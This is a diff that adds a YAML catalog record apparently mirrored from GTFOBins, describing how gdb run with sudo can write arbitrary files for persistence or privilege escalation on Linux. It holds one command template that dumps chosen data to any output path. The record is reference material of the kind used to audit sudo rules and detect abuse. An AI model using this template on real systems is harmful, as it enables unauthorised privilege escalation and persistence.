@@ -1,0 +1,24 @@
+id: gtfobins/gdb/file-write/sudo
+type: binary
+platform: linux
+name: gdb
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
+references:
+- https://gtfobins.github.io/gtfobins/gdb/
+tags:
+- linux
+- unix
+- gtfobins
